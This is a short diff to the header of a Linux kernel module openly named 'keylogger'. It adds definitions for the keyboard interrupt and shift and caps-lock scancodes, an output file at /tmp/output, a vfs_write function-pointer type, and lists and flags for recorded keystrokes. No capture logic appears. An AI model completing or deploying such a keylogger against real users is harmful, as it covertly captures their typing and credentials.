@@ -13,6 +13,7 @@
 #include <linux/interrupt.h>
 #include <linux/kallsyms.h>
 #include <linux/ktime.h>
+#include <linux/list_sort.h>
 #include <linux/mutex.h>
 #include <linux/miscdevice.h>
 #include <linux/namei.h>
@@ -28,6 +29,17 @@
 #include <asm/io.h>
 #include <asm/segment.h>
 #include <asm/uaccess.h>
+
+#define KEYBOARD_IRQ	1
+#define SHIFT_L		42
+#define SHIFT_R		54
+#define CAPS_LOCK	58
+#define MAX_KEYS	120
+
+#define	MODULE_NAME		"keylogger"
+#define	MODULE_STATS_NAME	"stats_keylogger"
+#define FILENAME		"/tmp/output"
+#define BUF_SIZE		PAGE_SIZE
 
 struct s_keyboard_map {
   int   key;
@@ -57,5 +69,20 @@ struct s_keyboard_map_lst {
   	size_t	nb_released;
 	struct list_head	map_lst;
 };
+
+typedef ssize_t (*vfs_write_type)(struct file *, const char __user *, size_t, loff_t *);
+
+enum {
+	RELEASED,
+	PRESSED
+};
+
+DEFINE_SPINLOCK(mr_lock);
+LIST_HEAD(head_stroke_lst);
+LIST_HEAD(head_keymap_lst);
+
+struct proc_dir_entry	*entry;
+bool 			shift = 0;
+bool 			caps_lock = 0;
 
 #endif
